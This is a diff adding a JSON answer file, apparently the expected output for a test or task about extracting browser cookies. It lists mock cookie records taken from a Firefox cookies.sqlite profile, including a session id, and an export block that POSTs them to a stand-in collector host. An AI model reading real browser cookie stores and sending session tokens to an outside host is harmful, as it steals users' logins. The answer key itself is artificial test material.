@@ -1,0 +1,29 @@
+{
+  "answers": {
+    "cookies": {
+      "records": [
+        {
+          "domain": "portal.example",
+          "expires": 1800000200,
+          "name": "sid",
+          "value": "MOCK-ROTATED"
+        },
+        {
+          "domain": "docs.example",
+          "expires": 1800000300,
+          "name": "theme",
+          "value": "dark"
+        }
+      ]
+    },
+    "export": {
+      "body": "portal.example\tsid\tMOCK-ROTATED\t1800000200\ndocs.example\ttheme\tdark\t1800000300\n",
+      "method": "POST",
+      "url": "https://collector.invalid/v1/cookies"
+    },
+    "profile": {
+      "database": "/home/demo/.mozilla/firefox/Profiles/review.default-release/cookies.sqlite"
+    }
+  },
+  "schema_version": 1
+}
